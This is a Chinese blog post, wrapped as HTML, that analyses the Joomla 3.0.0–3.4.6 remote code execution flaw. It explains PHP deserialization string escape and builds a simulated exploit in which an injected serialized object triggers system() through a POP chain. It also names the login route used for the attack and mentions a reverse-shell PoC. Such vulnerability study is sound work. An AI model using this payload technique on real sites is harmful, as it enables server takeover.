@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP,Joomla,unserialize," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Joomla 3.0.0 – 3.4.6 RCE 分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="joomla">
+<meta property="og:url" content="http://yoursite.com/2020/04/25/joomla/index.html">
+<meta property="og:site_name" content="0pa9ue">
+<meta property="og:description" content="Joomla 3.0.0 – 3.4.6 RCE 分析">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/25/joomla/10.png">
+<meta property="article:published_time" content="2020-04-25T11:05:20.000Z">
+<meta property="article:modified_time" content="2020-04-27T04:09:33.688Z">
+<meta property="article:author" content="0pa9ue">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Joomla">
+<meta property="article:tag" content="unserialize">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/25/joomla/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/25/joomla/"/>
+
+
+
+
+
+  <title>joomla | 0pa9ue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0pa9ue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/25/joomla/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0pa9ue">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0pa9ue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">joomla</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-25T19:05:20+08:00">
+                2020-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> Views
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Joomla 3.0.0 – 3.4.6 RCE 分析</p>
+<a id="more"></a>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>MAC OS X : 10.14.6<br>MAMP : 5.1<br>PHP : 5.5.38</p>
+<p>joomla环境搭建: <a href="https://github.com/joomla/joomla-cms/releases/tag/3.4.6" target="_blank" rel="noopener">https://github.com/joomla/joomla-cms/releases/tag/3.4.6</a></p>
+<h2 id="PHP-反序列化字符逃逸"><a href="#PHP-反序列化字符逃逸" class="headerlink" title="PHP 反序列化字符逃逸"></a>PHP 反序列化字符逃逸</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>先说PHP在反序列化时的几个特性</p>
+<ul>
+<li>以 ; 作为字段的分隔，以 } 作为结尾（字符串除外），并且是根据长度判断内容的</li>
+<li>对类中不存在的属性也会进行反序列化</li>
+</ul>
+<h4 id="v0"><a href="#v0" class="headerlink" title="v0"></a>v0</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $member = <span class="string">"member"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br><span class="line">var_dump(serialize($c));</span><br><span class="line"><span class="comment">// O:1:"C":1:&#123;s:6:"member";s:6:"member";&#125;</span></span><br><span class="line"></span><br><span class="line">$ser = <span class="string">'O:1:"C":2:&#123;s:6:"member";s:6:"member";s:7:"member2";s:7:"member2";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($ser));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/1.png" alt></p>
+<p>即使类C中没有member2的属性，但是在反序列化的过程中还是会将这个属性进行反序列化</p>
+<h4 id="v1"><a href="#v1" class="headerlink" title="v1"></a>v1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ser = <span class="string">'O:1:"C":2:&#123;s:6:"member";s:8:"member";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($ser));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/3.png" alt></p>
+<p>如果反序列化的过程中，值的长度与所标识的长度不匹配，则会报错</p>
+<h4 id="v2"><a href="#v2" class="headerlink" title="v2"></a>v2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ser = <span class="string">'O:1:"C":2:&#123;s:6:"member";s:6:"member";s:6:"member";s:7:"member2";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($ser));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/4.png" alt></p>
+<p>多次对一个属性进行反序列化，则是覆盖的操作</p>
+<h4 id="v3"><a href="#v3" class="headerlink" title="v3"></a>v3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ser = <span class="string">'O:1:"C":2:&#123;s:8:"username";s:3:"zww";s:8:"password";s:3:"zww";&#125;;s:8:"password";s:4:"fake";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($ser));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/2.png" alt></p>
+<p>php在反序列化的过程中，遇到了}符号，则作为序列化字符串的结尾，也就不再对后面的password=fake进行反序列化了</p>
+<h3 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h3><h4 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'x'</span>,<span class="string">'yy'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"zwwxx"</span>; &lt;&lt;</span><br><span class="line">$password = <span class="string">"aaaaa"</span>; &lt;&lt;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"></span><br><span class="line">var_dump($r);</span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure>
+
+<p>代码的流程是首先将数组反序列化输出，接着filter函数会处理反序列化字符串，将其中的x替换为yy，最后在输出序列化的反序列化字符串</p>
+<p>我们的目的是：如何值输入username情况下修改password呢？</p>
+<p>正常情况下的序列化是没有问题的 =&gt; a:2:{i:0;s:3:”zww”;i:1;s:5:”aaaaa”;}<br>但是，如果把 username 换成 zwwxx ，其处理后的序列化结果为 a:2:{i:0;s:5:”zwwyyyy”;i:1;s:5:”aaaaa”;}，这个时候肯定会反序列化失败的（s:7:”zwwyyyy” 比刚开始多了2个字符）</p>
+<p>回到前面v3的例子，如果最后反序列化的字符串是这样的，可以达到我们的目的吗</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ser = <span class="string">'a:2:&#123;i:0;s:3:"zww";i:1;s:6:"hacker";&#125;;i:1;s:5:"aaaaa";&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p>答案是肯定的，我们将 <strong>zww”;i:1;s:6:”hacker”;}</strong> 看作是输入的username就可以了（第一个}后面的分号可有可无，因为php反序列化在遇到}时就已经停止反序列化了，所以后面不论合法不合法都没关系）</p>
+<p>那么还有一个问题，我们如何解决标识长度的那个字段呢？（它要和后面字符串的长度匹配）</p>
+<p>filter函数可以帮我们解决这个问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">替换前：a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">"zwwxx"</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"aaaaa"</span>;&#125;</span><br><span class="line">替换后：a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">"zwwyyyy"</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"aaaaa"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样是s:5，替换前是可以正常的读完序列化字段的内容的<strong>zwwxx</strong>，但是在替换后，因为s:5没变，所以实际上读到的序列化字段的内容是<strong>zwwyy</strong>，并且y后面不是一个正常的双引号作为字段内容的结尾，所以在这里是无法反序列化成功的。于是我们就要增加替换前的长度，使其可以吞掉后面的序列化的属性，同时通过双引号进行闭合</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入: zwwxxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span>hacker<span class="string">";&#125;</span></span><br><span class="line"><span class="string">                     +                                           +</span></span><br><span class="line"><span class="string">替换前: a:2:&#123;i:0;s:43:"</span>zwwxxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span>hacker<span class="string">";&#125;"</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"aaaaa"</span>;&#125;</span><br><span class="line">替换后: a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">43</span>:<span class="string">"zwwyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"</span>;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">"hacker"</span>;&#125;<span class="string">";i:1;s:5:"</span>aaaaa<span class="string">";&#125;</span></span><br><span class="line"><span class="string">                     +                                           +</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/6.png" alt></p>
+<p>因为 <strong>“;i:1;s:6:”hacker”;}</strong> 的长度为20，同时1个x会被替换为2个y，所以我们需要20个x来作为 <strong>“;i:1;s:6:”hacker”;}</strong> 的替代，使得变换前与变换后的字符串的长度相等（看上面+号所包括的区域）</p>
+<p>可以看到我们已经成功修改了password的值为hacker</p>
+<h4 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'yy'</span>,<span class="string">'x'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"zwwyyyy"</span>; </span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"></span><br><span class="line">var_dump($r);</span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure>
+
+<p>因为字符长度在filter后变短了，所以我们就可以吃掉后面的属性，并增添一个新的属性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username = <span class="string">'zwwyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'</span>;</span><br><span class="line">$password = <span class="string">'aaaaa";i:3;s:3:"new";&#125;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/joomla/5.png" alt></p>
+<p>可以看到，array[1]被吞掉了，并增添了array[3] = new</p>
+<p>那么为什么会出现PHP反序列化逃逸的现象，我认为是在序列化一个对象后，对序列化字符串的长度，内容进行了变动，导致在重新反序列化的过程中造成逃逸</p>
+<h2 id="Joomla-RCE"><a href="#Joomla-RCE" class="headerlink" title="Joomla RCE"></a>Joomla RCE</h2><p><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">p神的博客</a>里有很细节的讲解</p>
+<p>同时，<a href="https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41" target="_blank" rel="noopener">这篇博客</a>也有很细致的讲解（其中用到了<a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">p神博客</a>的payload）</p>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>PHP对Session的存储是默认放在文件中，当有活动会话产生使用到Session时候，将会在服务端php设置好的路径写入一个文件，文件的内容为默认序列化处理器序列化后的数据<br>但在Joomla中则改变了PHP的默认处理规则，将序列化之后的数据存放在数据库中，然后需要取值的时候就从数据库中读取完数据后进行反序列化<br>这里使用的是在\libraries\joomla\session\storage\database.php下的read, write处理函数。read函数即为读取序列化字符串，write函数为写入序列化字符串<br>比较关键的部分:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">    $db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Get the session data from the database table.</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $result = (string) $db-&gt;loadResult();</span><br><span class="line"></span><br><span class="line">        $result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($id, $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">    $db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to update the session data in the database table.</span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看出，在存入数据库之前，会将传入数据中的chr(0) . ‘*’ . chr(0) 替换为\0\0\0（read函数）， 原因是mysql数据库无法处理NULL字节，而protected 修饰符修饰的字段在序列化之后是以\x00\x2a\x00开头的，然后从数据库中取出来的时候，再将字符进行替换还原（write函数），防止无法正常反序列化</p>
+<p>但是我们在上面的例子中探讨过了这样的问题，如果在重新反序列化前对序列化的字符串的长度和内容进行了更改，那么就很有可能造成反序列化字符串逃逸的问题</p>
+<p>在将session从数据库中取出时，read函数会将”\0\0\0”替换为chr(0) . ‘*’ . chr(0)，由6个字符缩短为了3个字符。那么如果我们在存入的时候就注入一系列的\0\0\0，通过write函数写入了数据库时是没有问题的，但是在read的时候，因为进行了替换的缘故，造成了反序列化后字段内容的长度会缩短，这时我们按照上面的分析方法注入对象和属性后，就可以逃逸了</p>
+<h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><p>下面是<a href="https://www.cnblogs.com/magic-zero/p/11643916.html" target="_blank" rel="noopener">这篇博客</a>的伪代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pop 利用链</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(system(<span class="keyword">$this</span>-&gt;cmd)); <span class="comment">// rce</span></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟真实的登陆处理逻辑</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($id, $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">    $arr = <span class="keyword">array</span>($id =&gt; $data);</span><br><span class="line">    file_put_contents(<span class="string">"db.txt"</span>, json_encode($arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = file_get_contents(<span class="string">"db.txt"</span>);</span><br><span class="line">    $result = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">    $result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result[$id]);</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送的username 值</span></span><br><span class="line">$username = <span class="string">"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0"</span>; <span class="comment">// 8个\\0\\0\\0</span></span><br><span class="line"></span><br><span class="line">$password = <span class="string">'A";'</span>; <span class="comment">// padding</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个fake password字段，将其内容设置为一个恶意构造的对象</span></span><br><span class="line">$shellcode = <span class="string">'s:3:"zww";O:4:"Evil":1:&#123;s:3:"cmd";s:2:"ls";&#125;&#125;'</span>;</span><br><span class="line"><span class="comment">//注意                                                     ^</span></span><br><span class="line">$password = $password . $shellcode;</span><br><span class="line"></span><br><span class="line">write(<span class="string">"123"</span>, serialize(<span class="keyword">new</span> User($username, $password)));</span><br><span class="line"></span><br><span class="line">var_dump(read(<span class="string">"123"</span>));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(read(<span class="string">"123"</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里将write和read函数简化，数据库操作部分使用文件代替</p>
+<p>我们需要吞掉整个password字段，具体来说，同时注入POC链来进行RCE<br>需要吞掉的部分为 <strong>“;s:8:”password”;s:54:”xxx</strong>，总共为23个固定字符和长度为n的password。因为在进行替换的时候由6个字符变成了3个字符，所以我们要让23+n为3的倍数，n=1, 4, 7······都可以</p>
+<p>我们选择n=1，也就是总共需要吃掉24个字符，使用8个\0\0\0作为username的输入即可。对于password，我们需要使用”;对前面的属性进行闭合，然后在自己添加一个新的属性（参考上面的例子v0）作为pop链</p>
+<p><img src="/2020/04/25/joomla/7.png" alt></p>
+<p>最后一个问题是，我们可以在哪里利用这个漏洞呢？这里又牵扯到Joomla的一个特性，一个未登陆的用户如果进行登陆，那么他的登陆信息也会被序列化之后存入到数据库之中，这样无论我们知不知道是否存在这样一个用户，也能够进行rce</p>
+<p>路由: index.php/component/users/?view=login<br><img src="/2020/04/25/joomla/8.png" alt></p>
+<h3 id="POC简析"><a href="#POC简析" class="headerlink" title="POC简析"></a>POC简析</h3><p>大致讲解一下这个<a href="https://github.com/kiks7/rusty_joomla_rce/blob/master/rusty_joomla_exploit.py" target="_blank" rel="noopener">payload</a>构造的思路：</p>
+<p>poc会发送两次请求，第一次（check）对url进行检测，查看是否存在漏洞，第二次（exploit）则是进行rce以及反弹shell</p>
